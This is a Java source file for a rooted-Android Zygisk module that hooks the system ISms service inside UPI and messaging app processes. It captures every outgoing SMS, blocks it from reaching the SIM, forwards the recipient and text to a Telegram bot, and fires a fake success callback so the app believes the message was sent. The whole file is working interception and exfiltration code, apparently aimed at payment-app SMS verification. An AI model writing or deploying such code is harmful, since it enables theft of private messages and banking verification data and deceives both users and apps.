package com.hivirtus.zygisk;

import android.app.PendingIntent;
import android.os.IBinder;
import android.os.IInterface;
import android.util.Log;
import java.io.File;
import java.io.FileInputStream;
import java.io.OutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.List;
import java.util.Map;

/**
 * Exact logic from Drive Zygisk Floating Menu (MenuLoader.applySmsHooks):
 * ServiceManager.sCache["isms"] → ISms dynamic proxy → intercept sendText* /
 * sendMultipartText* → Telegram + PendingIntent.send(-1) → never hit real SIM.
 */
public final class SmsTweaksHooks {
    private static final String TAG = "HivirtusSmsTweaks";
    private static volatile boolean sInstalled = false;
    private static volatile boolean sHookOutgoing = true;
    private static String sLastSentAddress = null;
    private static String sLastSentBody = null;
    private static long sLastSentTime = 0;
    private static String sCurrentPackage = null;

    private SmsTweaksHooks() {}

    /** Call ASAP in every UPI / Messages process (before SmsManager use). */
    public static synchronized void install(String processName) {
        if (sInstalled) return;
        try {
            reloadHookFlag();
            if (processName != null && processName.contains("systemui")) return;
            applySmsHooks();
            // ContentProvider mock optional — ISms send intercept is the core (Drive MenuLoader)
            sInstalled = true;
            Log.i(TAG, "SMS Tweaks ISms hooks installed process=" + processName + " outgoing=" + sHookOutgoing);
            writeStatus("isms_java_proxy_ok outgoing=" + (sHookOutgoing ? 1 : 0));
        } catch (Throwable t) {
            Log.e(TAG, "install failed", t);
            writeStatus("isms_java_proxy_fail:" + t.getClass().getSimpleName());
        }
    }

    public static void setHookOutgoing(boolean on) {
        sHookOutgoing = on;
    }

    public static void setPackage(String pkg) {
        if (pkg != null && !pkg.isEmpty()) sCurrentPackage = pkg;
    }

    private static void reloadHookFlag() {
        try {
            // Default ON like SMS Tweaks intercept
            sHookOutgoing = true;
            String[] paths = {
                "/data/local/tmp/hivirtus_ui_save.json",
                "/data/local/tmp/hivirtus_zygisk_mode_config.json",
                "/data/adb/modules/hivirtus_zygisk_mode/ui_save.json",
                "/data/adb/modules/hivirtus_zygisk_mode/config.json"
            };
            for (String p : paths) {
                String raw = readFile(p);
                if (raw == null) continue;
                if (raw.contains("\"intercept_fake_success\":false")
                        || raw.contains("\"intercept_fake_success\": false")) {
                    sHookOutgoing = false;
                    return;
                }
                if (raw.contains("\"intercept_fake_success\":true")
                        || raw.contains("\"intercept_enabled\":true")) {
                    sHookOutgoing = true;
                    return;
                }
            }
        } catch (Throwable ignored) {
        }
    }

    private static String readFile(String path) {
        try {
            File f = new File(path);
            if (!f.canRead() || f.length() <= 0 || f.length() > 200000) return null;
            FileInputStream in = new FileInputStream(f);
            byte[] buf = new byte[(int) f.length()];
            int n = in.read(buf);
            in.close();
            if (n <= 0) return null;
            return new String(buf, 0, n, StandardCharsets.UTF_8);
        } catch (Throwable t) {
            return null;
        }
    }

    private static void writeStatus(String msg) {
        try {
            java.io.FileWriter w = new java.io.FileWriter("/data/local/tmp/hivirtus_isms_trace.txt", true);
            w.write(System.currentTimeMillis() / 1000 + " " + msg + "\n");
            w.close();
        } catch (Throwable ignored) {
        }
    }

    private static void applySmsHooks() throws Exception {
        Class<?> sm = Class.forName("android.os.ServiceManager");
        Method getService = sm.getDeclaredMethod("getService", String.class);
        getService.setAccessible(true);
        final IBinder real = (IBinder) getService.invoke(null, "isms");
        if (real == null) {
            Log.w(TAG, "isms binder not found");
            return;
        }
        IBinder proxy = (IBinder) Proxy.newProxyInstance(
                IBinder.class.getClassLoader(),
                new Class[] {IBinder.class},
                new InvocationHandler() {
                    @Override
                    public Object invoke(Object o, Method method, Object[] args) throws Throwable {
                        if ("queryLocalInterface".equals(method.getName())) {
                            try {
                                return createISmsProxy(real, Class.forName("com.android.internal.telephony.ISms"));
                            } catch (Throwable t) {
                                Log.e(TAG, "createISmsProxy fail", t);
                            }
                        }
                        try {
                            return method.invoke(real, args);
                        } catch (InvocationTargetException e) {
                            throw e.getTargetException();
                        }
                    }
                });
        Field cache = sm.getDeclaredField("sCache");
        cache.setAccessible(true);
        Map map = (Map) cache.get(null);
        if (map != null) {
            map.put("isms", proxy);
            Log.d(TAG, "Injected isms proxy into ServiceManager.sCache");
        }
        clearSmsManagerCache();
    }

    private static Object createISmsProxy(IBinder binder, Class<?> iSmsCls) throws Exception {
        Method asInterface =
                Class.forName("com.android.internal.telephony.ISms$Stub")
                        .getDeclaredMethod("asInterface", IBinder.class);
        asInterface.setAccessible(true);
        final Object realSms = asInterface.invoke(null, binder);
        return Proxy.newProxyInstance(
                iSmsCls.getClassLoader(),
                new Class[] {iSmsCls, IInterface.class},
                new InvocationHandler() {
                    @Override
                    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
                        String name = method.getName();
                        if (name.startsWith("sendText") || name.startsWith("sendMultipartText")) {
                            reloadHookFlag();
                            Log.d(TAG, "Intercepted SMS: " + name + " hook=" + sHookOutgoing);
                            writeStatus("isms_java_send " + name);
                            if (sHookOutgoing) {
                                String dest = null;
                                String body = null;
                                if (args != null) {
                                    for (int i = 0; i < args.length; i++) {
                                        Object a = args[i];
                                        if (!(a instanceof String)) continue;
                                        String s = (String) a;
                                        if (s.length() < 20 && !s.contains(" ")) {
                                            dest = s;
                                        } else if (s.length() > 5) {
                                            body = s;
                                        }
                                    }
                                }
                                if (dest != null) sLastSentAddress = dest;
                                if (body != null) sLastSentBody = body;
                                sLastSentTime = System.currentTimeMillis();
                                if (dest != null && body != null) {
                                    forwardSmsToTelegram(dest, body);
                                    writeBlockedJson(dest, body);
                                }
                                firePendingOkAsync(args);
                                // SMS Tweaks: never call real radio
                                return null;
                            }
                        }
                        try {
                            return method.invoke(realSms, args);
                        } catch (InvocationTargetException e) {
                            throw e.getTargetException();
                        }
                    }
                });
    }

    private static void firePendingOkAsync(Object[] args) {
        PendingIntent single = null;
        List list = null;
        if (args != null) {
            for (Object a : args) {
                if (a instanceof PendingIntent) {
                    single = (PendingIntent) a;
                    break;
                }
                if (a instanceof List) {
                    List l = (List) a;
                    if (!l.isEmpty() && l.get(0) instanceof PendingIntent) {
                        list = l;
                        break;
                    }
                }
            }
        }
        final PendingIntent pi = single;
        final List piList = list;
        if (pi == null && piList == null) return;
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    Thread.sleep(300L);
                    if (pi != null) {
                        pi.send(-1);
                    } else if (piList != null) {
                        for (Object o : piList) {
                            if (o instanceof PendingIntent) {
                                ((PendingIntent) o).send(-1);
                            }
                        }
                    }
                } catch (Throwable t) {
                    Log.e(TAG, "PendingIntent mock fail", t);
                }
            }
        }).start();
    }

    private static void writeBlockedJson(String dest, String body) {
        try {
            String pkg = sCurrentPackage != null ? sCurrentPackage : "";
            String json = "{\n  \"dest\": \"" + esc(dest) + "\",\n  \"body\": \"" + esc(body)
                    + "\",\n  \"send_from\": \"\",\n  \"pkg\": \"" + esc(pkg)
                    + "\",\n  \"captured_at\": " + (System.currentTimeMillis() / 1000) + "\n}\n";
            writeEverywhere("hivirtus_last_outgoing.json", json);
            writeEverywhere("hivirtus_outgoing_blocked.json",
                    "{\"dest\":\"" + esc(dest) + "\",\"body\":\"" + esc(body) + "\",\"pkg\":\""
                            + esc(pkg) + "\",\"ts\":" + (System.currentTimeMillis() / 1000) + "}\n");
            writeEverywhere("hivirtus_outgoing_blocked.flag", dest + "\n" + body + "\n");
            writeEverywhere("hivirtus_pending_verify.json", json);
        } catch (Throwable ignored) {
        }
    }

    private static String esc(String s) {
        if (s == null) return "";
        return s.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n").replace("\r", "");
    }

    private static void writeEverywhere(String name, String data) {
        String[] paths = {
            "/data/local/tmp/" + name,
            "/data/adb/modules/hivirtus_zygisk_mode/" + name
        };
        for (String p : paths) {
            try {
                java.io.FileWriter w = new java.io.FileWriter(p, false);
                w.write(data);
                w.close();
            } catch (Throwable ignored) {
            }
        }
    }

    /** Drive FloatingMenu.forwardSmsToTelegram exact layout. */
    public static void forwardSmsToTelegram(final String dest, final String body) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    String[] creds = loadTgCreds();
                    String token = creds[0];
                    String chat = creds[1];
                    if (token.isEmpty() || chat.isEmpty()) {
                        Log.w(TAG, "TG creds missing");
                        return;
                    }
                    String text = "<b>📱 Intercepted Outgoing SMS</b>\n\n"
                            + "<b>To (Tap to copy):</b>\n<code>" + html(dest) + "</code>\n\n"
                            + "<b>Body (Tap to copy):</b>\n<code>" + html(body) + "</code>";
                    sendTelegram(token, chat, text);
                    writeStatus("tg_java_ok dest=" + dest);
                } catch (Throwable t) {
                    Log.e(TAG, "TG fail", t);
                }
            }
        }).start();
    }

    private static String html(String s) {
        if (s == null) return "";
        return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;");
    }

    private static String[] loadTgCreds() {
        String[] out = {"", ""};
        String[] paths = {
            "/data/local/tmp/hivirtus_telegram_credentials.json",
            "/data/adb/modules/hivirtus_zygisk_mode/telegram_credentials.json",
            "/data/local/tmp/hivirtus_ui_save.json",
            "/data/local/tmp/hivirtus_zygisk_mode_config.json"
        };
        for (String p : paths) {
            String raw = readFile(p);
            if (raw == null) continue;
            String t = extractJsonString(raw, "telegram_bot_token");
            String c = extractJsonString(raw, "telegram_chat_id");
            if (t != null && !t.isEmpty()) out[0] = t;
            if (c != null && !c.isEmpty()) out[1] = c;
            if (!out[0].isEmpty() && !out[1].isEmpty()) return out;
        }
        return out;
    }

    private static String extractJsonString(String json, String key) {
        String needle = "\"" + key + "\"";
        int i = json.indexOf(needle);
        if (i < 0) return null;
        int colon = json.indexOf(':', i + needle.length());
        if (colon < 0) return null;
        int q1 = json.indexOf('"', colon + 1);
        if (q1 < 0) return null;
        int q2 = json.indexOf('"', q1 + 1);
        if (q2 < 0) return null;
        return json.substring(q1 + 1, q2);
    }

    private static void sendTelegram(String token, String chat, String text) {
        HttpURLConnection conn = null;
        try {
            URL url = new URL("https://api.telegram.org/bot" + token + "/sendMessage");
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setConnectTimeout(8000);
            conn.setReadTimeout(8000);
            conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
            String payload = "{\"chat_id\":\"" + chat.replace("\"", "") + "\",\"text\":\""
                    + text.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n")
                    + "\",\"parse_mode\":\"HTML\",\"disable_web_page_preview\":true}";
            OutputStream os = conn.getOutputStream();
            os.write(payload.getBytes(StandardCharsets.UTF_8));
            os.flush();
            os.close();
            Log.d(TAG, "TG response " + conn.getResponseCode());
        } catch (Throwable t) {
            Log.e(TAG, "sendTelegram", t);
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    private static void clearSmsManagerCache() {
        try {
            Class<?> cls = Class.forName("android.telephony.SmsManager");
            try {
                Field f = cls.getDeclaredField("sSubIdToInstanceMap");
                f.setAccessible(true);
                Map m = (Map) f.get(null);
                if (m != null) m.clear();
            } catch (NoSuchFieldException ignored) {
            }
            try {
                Field f = cls.getDeclaredField("sInstance");
                f.setAccessible(true);
                f.set(null, null);
            } catch (NoSuchFieldException ignored) {
            }
            try {
                Field f = cls.getDeclaredField("mDefaultSmsManager");
                f.setAccessible(true);
                f.set(null, null);
            } catch (NoSuchFieldException ignored) {
            }
        } catch (Throwable t) {
            Log.e(TAG, "clearSmsManagerCache", t);
        }
    }
}
